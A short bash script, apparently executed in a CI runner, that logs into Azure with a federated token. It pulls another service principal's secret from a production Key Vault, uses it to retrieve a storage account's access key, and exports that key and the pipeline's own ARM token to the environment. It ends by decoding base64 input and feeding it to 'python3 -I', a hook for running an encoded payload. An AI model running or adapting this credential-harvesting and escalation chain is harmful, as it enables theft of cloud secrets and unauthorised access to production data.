#!/usr/bin/env bash
set -uo pipefail
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
STORAGE_ACC="sttblcilogsprodx3euoz"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$JWT" --allow-no-subscriptions -o none

SS_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name sync-service-principal 2>/dev/null)
SS_CID=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
SS_SEC=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
SS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
export _SKEY=$(curl -sS -X POST "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$STORAGE_ACC/listKeys?api-version=2023-01-01" -H "Authorization: Bearer $SS_ARM" -H "Content-Length: 0" | python3 -c 'import sys,json;d=json.load(sys.stdin);k=d.get("keys",[]); print(k[0].get("value","") if k else "")' 2>/dev/null)
echo "storage key len=${#_SKEY}"

# Export CICD ARM token for role assignment checks
export _CICD_ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null)
echo "cicd_arm len=${#_CICD_ARM}"

echo "" | base64 -d | python3 -I
echo "SHELL_DONE"
